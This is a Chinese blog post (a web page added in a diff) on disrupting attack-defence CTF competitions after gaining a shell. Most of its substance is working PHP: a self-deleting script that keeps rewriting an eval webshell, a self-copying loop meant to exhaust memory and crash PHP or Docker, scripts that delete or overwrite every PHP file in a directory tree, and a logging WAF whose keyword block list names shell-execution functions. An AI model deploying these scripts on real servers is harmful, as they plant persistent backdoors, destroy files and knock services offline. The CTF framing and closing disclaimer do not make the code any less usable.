@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>論如何在CTF比賽中攪屎 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="Virink,技术博客,CTF,Writeup,代码审计,AUDIT,php,ctf">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+<link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.com/atom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2017/05/25/how_to_fuck_the_ctf.html">論如何在CTF比賽中攪屎</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/php/"><i class="fa fa-tag"></i>php</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-05-25 04:44:32">2017-05-25 04:44:32</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>0x00 前言</h2>
+<p>不能攪屎的CTF不是好CTF，不能攪屎的題目不是好題目。</p>
+<p>我很贊成phithon神的一句話，“比賽就是和他人競爭的過程，通過各種手段阻止對手拿分我覺得也是一種能力。”</p>
+<p>你能夠做到別人做不到的，那就是你的本事。</p>
+<p>本文所說的攪屎是在GETSHELL的情況下才能進行的！！！遇到phithon師傅的《CTF主辦方指南之對抗攪屎棍》就GG了</p>
+<h2>0x01 預備知識</h2>
+<p>大多數能夠攪屎的題目基本上是PHP且需要getshell的。所以，必備的PHP語法基本只是必須要懂~</p>
+<p>接下來是介紹一些特殊的PHP內置函數</p>
+<ul>
+<li><a href="http://php.net/manual/zh/function.ignore-user-abort.php">ignore_user_abort()</a><ul>
+<li>设置客户端断开连接时是否中断脚本的执行</li>
+<li>PHP以命令行脚本执行时，当脚本终端结束，脚本不会被立即中止，除非设置 value 为 TRUE，否则脚本输出任意字符时会被中止。</li>
+<li><code>ignore_user_abort(1);</code></li>
+</ul>
+</li>
+<li><a href="http://php.net/manual/zh/function.set-time-limit.php">set_time_limit()</a><ul>
+<li>设置脚本最大执行时间</li>
+<li>设置允许脚本运行的时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒，或者是在php.ini的max_execution_time被定义的值，如果此值存在。</li>
+<li><code>set_time_limit(0);</code></li>
+</ul>
+</li>
+<li><a href="http://php.net/manual/zh/function.ini-get.php">ini_get()</a><ul>
+<li>获取一个配置选项的值</li>
+<li>成功时返回配置选项的值。</li>
+<li><code>echo 'disable_functions='.ini_get('disable_functions');</code></li>
+</ul>
+</li>
+<li><a href="http://php.net/manual/zh/function.file-put-contents.php">file_put_contents()</a><ul>
+<li>将一个字符串写入文件</li>
+<li>和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</li>
+<li><code>file_put_contents($filename, $content);</code></li>
+</ul>
+</li>
+<li><a href="http://php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a><ul>
+<li>将整个文件读入一个字符串</li>
+<li>和 file() 一样，只除了 file_get_contents() 把文件读入一个字符串。将在参数 offset 所指定的位置开始读取长度为 maxlen 的内容。如果失败，file_get_contents() 将返回 FALSE。</li>
+<li><strong>當然這個函數也可以通過其他協議讀取文件內容</strong></li>
+<li><code>file_get_contents($filename);</code></li>
+<li><code>file_get_contents($url);</code></li>
+</ul>
+</li>
+<li><a href="http://php.net/manual/zh/function.unlink.php">unlink()</a><ul>
+<li>删除文件</li>
+<li>删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。</li>
+<li><code>unlink($filename);</code></li>
+</ul>
+</li>
+</ul>
+<p>給你的PHP腳本加上<code>set_time_limit(0);ignore_user_abort(1);</code>這兩句就能夠做的常駐內存了。</p>
+<p>對待這種情況，基本上只能重啟PHP了。</p>
+<h2>0x02 攪屎之不死鳥</h2>
+<p><strong>no_die_shell.php</strong></p>
+<pre><code>&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    //file_put_contents(__FILE__,'');
+    while(1){
+        file_put_contents('path/webshell.php','&lt;?php @eval($_POST["password"]);?&gt;');
+    }
+?&gt;
+</code></pre>
+<p>首先就是刪除自己，不讓別人知道，然後在某一個目錄下循環生成你的webshell，根本刪不掉~~</p>
+<h2>0x03 攪屎之核彈</h2>
+<p><strong>nuclear_bomb.php</strong></p>
+<pre><code>&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(true);
+    while(1){
+        file_put_contents(randstr().'.php',file_get_content(__FILE__));
+        file_get_contents("http://127.0.0.1/");
+    }
+?&gt;
+</code></pre>
+<p>根據代碼，不難看出這個腳本的功能。</p>
+<p>常駐內存之後，進入死循環。</p>
+<p>循環內部是實現無效複製自身並且訪問web服務的功能。</p>
+<p>執行的後果就是內存爆炸，php就GG了，嚴重點的話，Docker也GG。</p>
+<h2>0x04 攪屎之你死我活</h2>
+<p><strong>del.php</strong></p>
+<pre><code>&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    array_map('unlink', glob("some/dir/*.php"));
+?&gt;
+</code></pre>
+<p><strong>del_or_change.php</strong></p>
+<pre><code>&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    function getfiles($path){
+        foreach(glob($path) as $afile){
+            if(is_dir($afile))
+                getfiles($afile.'/*.php');
+            else
+                @file_put_contents($afile,"#Anything#");
+                //unlink($afile);
+        }
+    }
+    while(1){
+        getfiles(__DIR__);
+        sleep(10);
+    }
+?&gt;
+</code></pre>
+<p>遍曆目錄，得到所有的php文件，然後至於你想改寫內容還是直接刪掉，看心情了。</p>
+<p>遍曆目錄的方法很多，但是大多數這些函數都被禁用了（disable_functions）。</p>
+<p>偶爾有個別漏網之魚，比如glob~~這個函數比較少見吧。所以這樣就用了它。</p>
+<p>如果刪除函數unlink被ban掉~~就改寫咯~~</p>
+<h2>0x05 攪屎之WAF</h2>
+<p>感覺這個殺器有點邪惡。對於線下賽來說，近乎於無敵，反正我自己沒有什麼好的方法破解。</p>
+<p>噁心人啊。</p>
+<p><strong>php_waf_and_log_to_txt.php</strong></p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    define('LOG_FILENAME','log.txt');
+    function waf()
+    {
+        if (!function_exists('getallheaders')) {
+            function getallheaders() {
+                foreach ($_SERVER as $name =&gt; $value) {
+                    if (substr($name, 0, 5) == 'HTTP_')
+                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
+                }
+                return $headers;
+            }
+        }
+        $get = $_GET;
+        $post = $_POST;
+        $cookie = $_COOKIE;
+        $header = getallheaders();
+        $files = $_FILES;
+        $ip = $_SERVER["REMOTE_ADDR"];
+        $method = $_SERVER['REQUEST_METHOD'];
+        $filepath = $_SERVER["SCRIPT_NAME"];
+        //rewirte shell which uploaded by others, you can do more
+        foreach ($_FILES as $key =&gt; $value) {
+            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
+            file_put_contents($_FILES[$key]['tmp_name'], "virink");
+        }
+        unset($header['Accept']);//fix a bug
+        $input = array("Get"=&gt;$get, "Post"=&gt;$post, "Cookie"=&gt;$cookie, "File"=&gt;$files, "Header"=&gt;$header);
+        //deal with
+        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
+        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
+        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
+        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
+        $vpattern = explode("|",$pattern);
+        $bool = false;
+        foreach ($input as $k =&gt; $v) {
+            foreach($vpattern as $value){
+                foreach ($v as $kk =&gt; $vv) {
+                    if (preg_match( "/$value/i", $vv )){
+                        $bool = true;
+                        logging($input);
+                        break;
+                    }
+                }
+                if($bool) break;
+            }
+            if($bool) break;
+        }
+    }
+    function logging($var){
+        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);
+        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
+    }
+    waf();
+?&gt;
+</code></pre>
+<p>這個WAF在線下攻防賽中，絕對是一個大殺器。</p>
+<p>不僅攔截了大多數非法語句，還能記錄所有的攻擊流量，輕鬆得到別人的payload。</p>
+<p>不知道主辦方要如何解決這個WAF所存在的問題。</p>
+<p>當然，這個WAF應該也不是完美的，還可以添加更多的規則，讓他變得更強！</p>
+<p>接下來再說說，在實戰中如何加載這個WAF。</p>
+<p>根據權限不同，就有不同的加載方式。</p>
+<h3>有root權限</h3>
+<p>那麼，這樣就簡單了，直接寫在配置中。</p>
+<pre><code>vim php.ini
+
+auto_append_file = "/dir/path/phpwaf.php"
+</code></pre>
+<p>重啟Apache或者php-fpm就能生效了。</p>
+<p>當然也可以寫在 <em>.user.ini</em> 或者 <em>.htaccess</em> 中。</p>
+<pre><code>php_value auto_prepend_file "/dir/path/phpwaf.php"
+</code></pre>
+<h3>只有user權限</h3>
+<p>沒寫系統權限就只能在代碼上面下手了，也就是文件包含。</p>
+<p>這鐘情況又可以用不同的方式包含。</p>
+<p>如果是框架型應用，那麼就可以添加在入口文件，例如index.php，</p>
+<p>如果不是框架應用，那麼庫在公共配置文件config.php中包含。</p>
+<pre><code>include('phpwaf.php');
+</code></pre>
+<p>還有一種是替換index.php，也就是講index.php改名為index2.php，然後講phpwaf.php改成index.php。</p>
+<p>當然還沒完，還要在原phpwaf.php中包含原來的index.php。</p>
+<pre><code>index.php -&gt; index2.php
+
+phpwaf.php -&gt; index.php
+
+include('index2.php');
+</code></pre>
+<p>至於你想用哪種方式，看你心情咯，你開心就好。</p>
+<h2>0x06 結束語</h2>
+<p>寫這篇文章的目的並不是讓大家都去CTF攪屎，畢竟CTF是一個正規的比賽的地方，有助於我們學習更多的技術以及黑科技。</p>
+<p>當然，服務器維護人員也是很辛苦的。</p>
+<p>我們暴打出題人就好了，何必為難運維。（出題人就是運維的情況下，例外！！！）</p>
+<p>希望大家用正確的心態看這篇文章，“PHP是世界上最好的語言”，能夠挖掘的地方還有很多。</p>
+<p>主辦方，表打我欸。</p>
+<h2>0x07 轉載聲明</h2>
+<p>本文投稿至 Freebuf <a href="http://www.freebuf.com/articles/web/118149.html">《论如何在CTF比赛中搅“shi”》</a></p>
+<blockquote>
+<p>本文原创作者：Virink，本文属FreeBuf原创奖励计划，未经许可禁止转载</p>
+</blockquote>
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2017/05/25/how_to_fuck_the_ctf.html" target="_blank">論如何在CTF比賽中攪屎</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-05-25 04:44:32">2017-05-25 04:44:32</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-11-23 00:57:15">2017-11-23 00:57:15</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2017/05/25/how_to_fuck_the_ctf.html" title="論如何在CTF比賽中攪屎" target="_blank">https://www.virzz.com/2017/05/25/how_to_fuck_the_ctf.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2018-2019. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">concise</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
